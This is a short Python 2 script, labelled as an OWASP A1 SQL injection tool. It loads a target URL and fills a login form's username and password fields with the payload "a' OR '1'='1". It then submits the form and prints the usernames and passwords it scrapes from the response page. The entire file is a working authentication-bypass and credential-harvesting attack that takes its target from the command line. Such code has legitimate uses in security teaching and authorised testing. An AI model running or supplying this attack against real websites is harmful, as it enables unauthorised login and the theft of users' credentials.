import mechanize
import sys
import getopt
from bs4 import BeautifulSoup


'''
OWASP top 10: 
A1.

Customise for every website:
Iterate through every form and then submit via Names
'''
def Usage():
  print("python ./sqlinjection.py -u <url-of-website (including http://)>")
  print("For help use -h")
  print("Incompatible with python3")

def main(args):
  try:
    opts,args = getopt.getopt(sys.argv[1:] , "hu:")
    if len(sys.argv[1:])<1:
      raise getopt.GetoptError("Invalid argument length")
  except getopt.GetoptError as err:
    print(err)
    Usage()
    sys.exit()
  print opts
  print "Args ",args
  for o,a in opts:
    if o in ("-h"):
      Usage()
      sys.exit()
    elif o in ("-u"):
      url=a
  print "Url of the website ", url
  br = mechanize.Browser()
  br.open(url)
  count=0
  br.select_form(nr=1)
  br["username"]="a' OR '1'='1"
  br["password"]="a' OR '1'='1"
  response=br.submit()
  soup = BeautifulSoup(response.read(),"html5lib")
  x=soup.find_all("span",{"reflectedxssexecutionpoint":1})
  for things in x:
    count+=1
    if count%2!=0:
      print "Username",things.get_text()
    if count%2==0:
      print "password",things.get_text()
      print "X---------------------X"

if __name__ == '__main__':
  main(sys.argv[1:])
